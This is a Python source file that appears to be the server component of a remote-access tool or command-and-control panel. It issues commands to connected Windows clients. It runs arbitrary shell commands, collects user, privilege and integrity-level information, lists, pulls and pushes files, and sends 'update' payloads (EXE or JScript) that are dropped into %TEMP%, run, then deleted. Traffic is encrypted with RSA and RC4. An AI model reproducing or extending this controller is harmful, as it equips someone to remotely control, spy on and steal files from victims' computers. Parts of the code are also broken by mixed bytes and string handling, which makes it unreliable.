
import binascii
import sys, os, struct, re, errno, time, random, hashlib, traceback, tempfile
import signal, subprocess
import BabyServer.corebaby.KeysManager
import socket
import cgi

SECURITY_MANDATORY_LOW_RID      = 0x00001000
SECURITY_MANDATORY_MEDIUM_RID   = 0x00002000
SECURITY_MANDATORY_HIGH_RID     = 0x00003000
SECURITY_MANDATORY_SYSTEM_RID   = 0x00004000

from BabyServer.corebaby.config2 import Conf

try: 

    # https://pypi.org/project/pycrypto/
    import Crypto, Crypto.Cipher.ARC4
except ImportError:

    print('ERROR: pycrypto is not installed')
    exit(-1)
    
try: 

    # https://pypi.org/project/M2Crypto/
    import M2Crypto, M2Crypto.RSA, M2Crypto.X509

except ImportError:

    print('ERROR: M2Crypto is not installed')
    exit(-1)   
    
try:

    # https://pypi.org/project/defusedxml/
    import defusedxml.minidom

except ImportError:

    print('ERROR: defusedxml is not installed')
    exit(-1)
 

g_log_file = None
g_start_time = time.time()
   
log_timestamp = lambda: time.strftime(Conf.TIME_FORMAT, time.localtime())

# mimetypes.init()
# mimetypes.types_map['.log'] = 'text/plain'


class ClientHelper(object):

    def __init__(self, client_id = None, sock = None):

        self.sock, self.client_id = sock, client_id
        self.redis = None

    def send(self, data):

        # send all of the data
        return self.sendall(data)

    def sendall(self, data):

        assert self.sock is not None

        return self.sock.sendall(data)            

    def recv(self, size):

        assert self.sock is not None

        return self.sock.recv(size)

    def recvall(self, size):

        ret = ''

        assert self.sock is not None

        while len(ret) < size:
            
            # receive specified amount of data
            data = self.sock.recv(size - len(ret))
            print("DEBUG :  DATA", data)
            
            assert len(data) > 0
            
            ret += data.decode()

        return ret

    def create_folders(self):

        assert self.client_id is not None

        if not os.path.isdir(Conf.LOG_DIR_PATH):

            # create base logs folder
            os.mkdir(Conf.LOG_DIR_PATH)    

        if not os.path.isdir(Conf.DOWNLOADS_DIR_PATH):

            # create base downloads folder
            os.mkdir(Conf.DOWNLOADS_DIR_PATH)        

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)
        downloads_path = os.path.join(Conf.DOWNLOADS_DIR_PATH, self.client_id)

        if not os.path.isfile(log_path):

            # create client log file
            with open(log_path, 'wb'): pass

        if not os.path.isdir(downloads_path):

            # create client downloads folder
            os.mkdir(downloads_path)    

    def get_id(self):

        assert self.sock is not None
        # query client ID
        self.sendall('id\n')

        ret = ''

        while len(ret) == 0 or ret[-1] != '\n':
            data = self.recv(Conf.BUFF_SIZE).decode()
            assert len(data) > 0

            ret += data

        data = data.strip()

        # validate received ID
        assert len(data) == 128 / 8 * 2
        assert re.search('^[A-Fa-f0-9]+$', data) is not None
        
        self.client_id = data
        return data

    def get_info(self):

        assert self.sock is not None

        # query basic client information
        self.sendall('info\n')

        ret = ''
        print("DEBUG send done + self.sock ok ==========>",self.sock)

        while len(ret) == 0 or ret[-1] != '\n':
            print("DEBUG INFO while ret ==========>",ret)
            
            data = self.recv(Conf.BUFF_SIZE).decode()
            
            assert len(data) > 0

            ret += data

        # parse and validate received information
        ret = ret.strip().split('|')
        
        computer, user, pid, path, admin, integrity = ret
        
        pid, admin, integrity = int(pid), int(admin), int(integrity)
        
        try:
            # get integruty level string from the RID constant
            integrity = {   SECURITY_MANDATORY_LOW_RID: 'Low',
                            SECURITY_MANDATORY_MEDIUM_RID: 'Medium',
                            SECURITY_MANDATORY_HIGH_RID: 'High',
                            SECURITY_MANDATORY_SYSTEM_RID: 'System',
                                                        0: 'None' }[integrity]

        except KeyError:

            integrity = 'Unknown'
        
        
        output = {
            "device":cgi.escape(computer),
            "username":cgi.escape(user),
            "pid": pid,
            "integrity" : integrity,
            "process":cgi.escape(path.split('\\')[-1]),
            "administrator": True if admin == 1 else False,  
            "id":"" 
        }
        print("DEBUG INFO have ret ==========>",output)
        
        return output 

    def ping(self):

        assert self.sock is not None

        self.sendall('ping\n')

    def exit(self):

        assert self.sock is not None

        self.sendall('exit\n')

    def uninstall(self):

        assert self.sock is not None

        self.sendall('uninst\n')

    def _is_end_of_output(self, data):    

        # check for end of the command output magic value
        m = re.search('\{\{\{#([0123456789abcdef]{8})\}\}\}$', data)
        if m is not None:

            # get exit code value
            return data[: data.find(m.group(0))], int('0x' + m.group(1), 16)

        return None

    def _execute(self, cmd, stream = None):

        cmd = cmd.strip()

        assert len(cmd) > 0
        assert self.sock is not None

        # send command string
        self.sendall(cmd.encode('UTF-8') + b'\n')
        print("DEBUG cmd =>",cmd )

        ret, code = '', None

        while True:

            # receive the command output
            data = self.recv(Conf.BUFF_SIZE).decode()
            
            assert len(data) > 0            
            
            m = self._is_end_of_output(data)
            if m is not None:

                # end of the command output
                data, code = m
            if "{" in data:
                continue
            
            ret += data            

            if m is not None: 

                break
        
        # ret = ret.decode('UTF-8')

        if stream is not None: 

            # write data to the stream at the end of the output
            stream.write(ret)

        return ret, code

    def execute(self, cmd, stream = None, log = True):

        assert self.client_id is not None

        log_path = os.path.join(Conf.LOG_DIR_PATH, '%s.log' % self.client_id)
        # print("DEBUG log path = ", log_path)

        with open(log_path, 'ab') as fd:

            if log:

                message = '[%s]: COMMAND: %s\n' % (log_timestamp(), cmd)
                # print("DEBUG MESSAGE = ", message.encode('UTF-8'))
                # write log file message
                fd.write(message.encode('UTF-8'))

            # execute command on the client
            data, code = self._execute('exec ' + cmd.strip(), stream = stream)
            # print("DEBUG data, code = ", data, code)

            if log:

                # log command output
                # fd.write('[%s]: EXIT CODE: 0x%.8x\n\n' % (log_timestamp(), code))
                fd.write(data.encode('UTF-8') + b'\n')

            return data, code

    def temp_path(self):

        # query %TEMP% environment variable from the client
        data, code = self.execute('echo %TEMP%', log = False)
        data = data.strip()

        if len(data) > 0 and data[-1] == '\\':

            # remove ending slash
            data = data[: -1]

        assert code == 0
        assert len(data) > 0

        return data

    def execute_wmi(self, wmi_class, props = None):

        assert self.client_id is not None

        query = '%s get ' % wmi_class

        if isinstance(props, str): query += props
        elif isinstance(props, list): query += ','.join(props)

        print('execute_wmi(%s): %s\n' % (self.client_id, query))

        # execute WMI query with XML output
        data, code = self.execute('wmic %s /format:rawxml' % query, log = False)
        data = data.strip()
        

        if code != 0:

            print('execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
            return None        

        try:

            assert len(data) > 0

            # parse query results
            doc = defusedxml.minidom.parseString(data)
            root = doc.documentElement
            res = root.getElementsByTagName('RESULTS')[0]

            try:

                # check for an error
                err = res.getElementsByTagName('ERROR')[0]
                print('execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
                return None

            except IndexError: pass

            ret = {}

            # enumerate returned properties
            for e in res.getElementsByTagName('PROPERTY'):

                name = e.getAttribute('NAME')
                vals = e.getElementsByTagName('VALUE')

                if len(vals) > 0 and len(vals[0].childNodes) > 0: 

                    # get property value
                    ret[name] = vals[0].childNodes[0].data

                else: 

                    ret[name] = None

            if isinstance(props, str): return ret[props]
            # print("kiet test =>>>>>>>>>>>>>>>>>>>>>>>>>>>>>",ret)

            return ret

        except Exception as why:

            print('execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
            return None

    def os_version(self):

        # get oprating system information from appropriate WMI class
        data = self.execute_wmi('os', props = [ 'Name', 'OSArchitecture' ])
        if data is None: return None

        try:
        
            # parse returned data
            return '%s %s' % (data['Name'].split('|')[0], data['OSArchitecture'])

        except KeyError:

            return None

    def hardware_info(self):

        # get CPU information
        info_cpu = self.execute_wmi('cpu', props = 'Name')
        if info_cpu is None: return None

        # get memory information
        info_mem = self.execute_wmi('os', props = 'TotalVisibleMemorySize')
        if info_mem is None: return None

        try:
        
            # parse returned data
            return '%s, %d GB RAM' % (info_cpu, int(info_mem) / (1024 * 1024) + 1)

        except KeyError:

            return None

    def update(self, path):

        assert os.path.isfile(path)

        name = os.path.basename(path)
        cmd, ext = '', name.split('.')[-1]

        # get temporary location to save the executable
        remote_path = self.temp_path() + '\\' + name

        if ext == 'exe': 

            # regular PE EXE
            cmd = remote_path

        elif ext == 'js': 

            # JScript file to be exected with cscript.exe
            cmd = 'cscript.exe ' + remote_path

        else:

            print('update(%s) ERROR: Unknown file type' % self.client_id)
            return False

        # upload file to the client
        if not self.file_put(remote_path, path):

            return False

        remote_cmd = 'cmd.exe /C "%s & ping 127.0.0.1 -n 3 > NUL & del %s"' % \
                     (cmd.encode('UTF-8'), remote_path.encode('UTF-8'))

        print('update(%s): %s\n' % (self.client_id, remote_cmd))

        # execute update command on the client
        self.sendall('upd ' + remote_cmd + '\n')

        try:

            assert len(self.recvall(1)) > 0
            return False

        except:

            return True

    def file_list(self, path):

        assert self.client_id is not None

        print('file_list(%s): %s\n' % (self.client_id, path))

        # list of the files in specified folder
        data, code = self._execute('flist ' + path.strip())
        if code != 0: 

            # command failed
            print('ERROR: file_list() failed with code 0x%.8x\n' % code)
            return None
        print("DEBUG FLIST DATA=========>",data)
        ret = []

        # enumerate results
        for line in data.strip().split('\n'):

            if len(line) == 0: continue

            line = line.split(' ')
            assert len(line) > 1

            # parse single file/directory information
            ret.append(( None if line[0] == 'D' else int(line[0], 16), ' '.join(line[1 :]) ))

        return ret

    def file_get(self, path, local_path):
        ret = False

        assert len(path) > 0
        assert self.sock is not None
        assert self.client_id is not None

        print('file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, path, local_path))

        # send download file command
        self.sendall(b'fget ' + path.encode('UTF-8') + b'\n')

        with open(local_path.encode('UTF-8'), 'wb') as fd:            

            # receive file size
            size = self.recvall(8).encode()
            assert len(size) == 8
            print("DEBUG : test size == ", size)
            size = struct.unpack('Q', size)[0]
            if size != 0xffffffffffffffff:

                recvd = 0

                print('file_get(%s): File size is %d\n' % (self.client_id, size))

                while recvd < size:
                    
                    # receive file contents
                    data = self.recv(min(Conf.BUFF_SIZE, size - recvd))
                    print(type(data))
                    if len(data) == 0:

                        raise Exception

                    # write the data into the local file
                    fd.write(data)
                    recvd += len(data)

                ret = True

            else:

                # command failed
                print('ERROR: file_get() failed\n')

        if not ret and os.path.isfile(local_path):

            # remove local file in case of any errors
            os.unlink(local_path)

        return ret

    def file_put(self, path, local_path):

        ret = False

        assert len(path) > 0
        assert os.path.isfile(local_path)
        assert self.sock is not None
        assert self.client_id is not None

        print('file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
                  (self.client_id, local_path, path))
        
        

        # get local file size
        size = os.path.getsize(local_path)

        print('file_put(%s): File size is %d\n' % (self.client_id, size))

        # send upload file command 
        self.sendall('fput ' + path.encode('UTF-8') + '\n')

        status = self.recvall(1)
        assert len(status) == 1

        status = struct.unpack('B', status)[0]
        if status == 0:

            # command failed
            print('ERROR: file_put() failed\n')
            return False

        # send file size
        self.sendall(struct.pack('Q', size))

        with open(local_path, 'rb') as fd:

            sent = 0

            while sent < size:

                # read file contents from the local file
                data = fd.read(min(Conf.BUFF_SIZE, size - sent))
                assert len(data) > 0
                
                # send data to the client
                self.sendall(data)
                sent += len(data)

            ret = True

        return ret

    def mapper_connect(self):

        # query client informaion
        client = self.client_get()
        if client is None: 

            return False

        # connect to the client process
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # print("kiettest map =++++++++++++++++++++++++++", ( Conf.MAPPER_HOST, client.map_port ))
        self.sock.connect(( Conf.MAPPER_HOST, client.map_port ))
        # 45348
        return True

    # def redis_connect(self):

    #     if self.redis is None:

    #         # connect to the database
    #         self.redis = redis.Redis(host = Conf.REDIS_HOST, port = Conf.REDIS_PORT, db = Conf.REDIS_DB)

    # def client_add(self, **props):

    #     assert self.client_id is not None

    #     self.redis_connect()

    #     print('client_add(%s)\n' % self.client_id)
        # add client info to the database
        
        # self.redis.set(self.client_id, json.dumps(props))

    # def client_get(self, client_id = None):
    #     client_id = self.client_id if client_id is None else client_id
    #     assert client_id is not None

    #     self.redis_connect()

    #     # get client info from the database
    #     data = self.redis.get(client_id)
    #     # create Client instance
    #     client_id = client_id.decode('UTF-8') if isinstance(client_id, bytes) else client_id
    #     return data if data is None else Client(client_id, **json.loads(data))

    # def client_del(self):

    #     assert self.client_id is not None

    #     self.redis_connect()

    #     print('client_del(%s)\n' % self.client_id)

    #     # remove client info from the database
    #     self.redis.delete(self.client_id)

    # def client_del_all(self):

    #     self.redis_connect()

    #     self.redis.flushdb()

    # def client_list(self):

    #     self.redis_connect()

    #     ret = []

    #     # enumerate all the known clients
    #     for k in list(self.redis.keys()):

    #         # query each client infor
    #         client = self.client_get(k)
    #         if client is not None: ret.append(client)

    #     return ret





class ClientDispatcher(object):    

    CLIENT_SESSION_KEY_BITS = 128
    CLIENT_SESSION_KEY_SIZE = CLIENT_SESSION_KEY_BITS / 8     

    def __init__(self, request, client_address):

        self.request = request
        self.client_address = client_address
        self.client_sock = None

        self.load_keys()

    def load_keys(self):
        ''' Initialize encryption keys and certificates '''

        self.crypt_send = None
        self.crypt_recv = None

        def cert_digest(peer_id):

            # get certificate path
            path = self.keys_manager.get_cert_path(peer_id)

            # load X509 certificate and compute hexadecimal digest
            cert = M2Crypto.X509.load_cert(path)
            return cert.get_fingerprint(self.keys_manager.CERT_DIGEST_NAME).upper()

        self.keys_manager = KeysManager(Conf.CERT_DIR_PATH)
        

        # load certificate and private key of server
        self.server_key = M2Crypto.RSA.load_key(self.keys_manager.get_key_path(Conf.CERT_NAME))
        self.server_cert = M2Crypto.X509.load_cert(self.keys_manager.get_cert_path(Conf.CERT_NAME))
        self.server_cert_digest = cert_digest(Conf.CERT_NAME).lower()
        print("DEBUG -----------> server_key = ",self.server_key, self.server_cert)

    def _recv(self, size = None):

        ret = b''

        if size is None:

            return self.request.recv(Conf.BUFF_SIZE)        

        while len(ret) < size:
            
            # receive specified amount of data
            data = self.request.recv(int(size - len(ret)))
            assert len(data) > 0

            ret += data

        return ret

    def _send(self, data):

        ret = 0

        while ret < len(data):
            
            # send all of the data
            size = self.request.send(data[ret :])
            assert size > 0

            ret += size

        return ret

    def _do_auth(self):
        if self.crypt_send is not None and self.crypt_recv is not None:
            return True

        class RC4Stream(object):

            def __init__(self, client, key):

                self.client = client
                self.ctx_send, self.ctx_recv = Crypto.Cipher.ARC4.new(key), \
                                               Crypto.Cipher.ARC4.new(key)                        

            def sendall(self, data): 

                assert self.ctx_send is not None

                return self.client.request.sendall(self.ctx_send.encrypt(data))

            def send(self, data):                

                return self.sendall(data)

            def recv(self, size):

                assert self.ctx_recv is not None

                return self.ctx_recv.encrypt(self.client.request.recv(size))

        # receive session key encrypted with the server public RSA key
        data = self._recv(self.keys_manager.CERT_KEY_SIZE)   

        try:

            # decrypt PKCS#1 encoded data
            data = self.server_key.private_decrypt(data, M2Crypto.RSA.pkcs1_padding)
        
            fmt = 'I%ds%ds' % (self.keys_manager.CERT_DIGEST_SIZE, \
                               self.CLIENT_SESSION_KEY_SIZE)
            # parse decrypted data--
            ver, digest, key = struct.unpack(fmt, data)
            # print("DEBUG : ver, digest, key ------------------->", (ver, digest, key))

        except:
            print("ERROR ===========> ", Exception)        

        # check server certificate digest
        digest =binascii.hexlify(digest).decode("ascii")
        digest = ''.join([str(b) for b in digest])
        
        
        if digest != self.server_cert_digest:
            # print("DEBUG : digest != self.server_cert_digest ", digest)
            raise Exception
        if ver != Conf.CLIENT_VERSION:
            raise Exception

        # send MD5 hash of session key to client to proove successful auth
        self._send(hashlib.md5(key).digest())
        
        # print("DEBUG send MD5 hash ===================> ",hashlib.md5(key).digest())

        # initialize RC4 context for client traffic encryption
        return RC4Stream(self, key)
      

    

class KeysManager(object):

    ''' Certificate properties. '''
    CERT_KEY_BITS = 2048
    CERT_KEY_SIZE = CERT_KEY_BITS / 8
    CERT_ENCRYPTION = 'rsa:' + str(CERT_KEY_BITS)
    CERT_SUBJECT = '/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd'
    CERT_EXPIRE = 365
    CERT_DIGEST_NAME = 'sha1'
    CERT_DIGEST_BITS = 160
    CERT_DIGEST_SIZE = CERT_DIGEST_BITS / 8

    ''' Getters for private key. '''
    get_key_path = lambda self, peer_name: os.path.join(self.keys_dir, peer_name) + '.key'
    get_key_data = lambda self, peer_name: open(self.get_key_path(peer_name)).read()

    ''' Getters for public certiicate. '''
    get_cert_path = lambda self, peer_name: os.path.join(self.keys_dir, peer_name) + '.crt'
    get_cert_data = lambda self, peer_name: open(self.get_cert_path(peer_name)).read()

    def __init__(self, keys_dir, openssl_win32_dir = None):

        self.keys_dir = keys_dir        
        self.openssl_win32_config_path = None

        if sys.platform == 'win32':

            assert openssl_win32_dir is not None

            # generate path to the win32 openssl executable
            self.openssl_win32_dir = openssl_win32_dir
            self.openssl_win32_path = os.path.join(openssl_win32_dir, 'bin', 'openssl.exe')
            self.openssl_win32_config_path = os.path.join(openssl_win32_dir, 'share', 'openssl.cnf')

            if not os.path.isfile(self.openssl_win32_path):

                raise IOError

            # use win32 version
            self.openssl_command = self.openssl_win32_path

        else:

            # use version that installed into the host system
            self.openssl_command = 'openssl'

    def generate_files(self, peer_name):

        def prepare_file(file_path):

            if os.path.isfile(file_path):

                # delete existing file
                os.unlink(file_path)

            return file_path
        
        key_path  = prepare_file(self.get_key_path(peer_name))
        cert_path = prepare_file(self.get_cert_path(peer_name))

        print(('Generating \"%s\" and \"%s\"' % (key_path, cert_path)))

        args = [ self.openssl_command,
                 'req', '-x509', '-nodes',
                 '-newkey', self.CERT_ENCRYPTION, 
                 '-keyout', key_path,
                 '-out', cert_path,
                 '-days', str(self.CERT_EXPIRE),
                 '-subj', self.CERT_SUBJECT ]        

        if self.openssl_win32_config_path is not None:

            args += [ '-config', self.openssl_win32_config_path ]

        # generating self-signed certificate using OpenSLL
        subprocess.call(args)

        def check_file(file_path):

            # check that file was sucessfully generated
            if not file_path:

                raise Exception

            return file_path

        check_file(key_path)
        check_file(cert_path)

    def generate(self, peer_name, overwrite = False):

        if not overwrite:

            if os.path.isfile(self.get_key_path(peer_name)) and \
               os.path.isfile(self.get_cert_path(peer_name)):

                   sys.stdout.write('Certificate for %s is already exists, overwrite? [Y/N]: ' % peer_name)

                   if sys.stdin.read(1).lower() != 'y':
                   
                        print('\n *** Abort!')
                        return

        print('')

        self.generate_files(peer_name)

        print('')
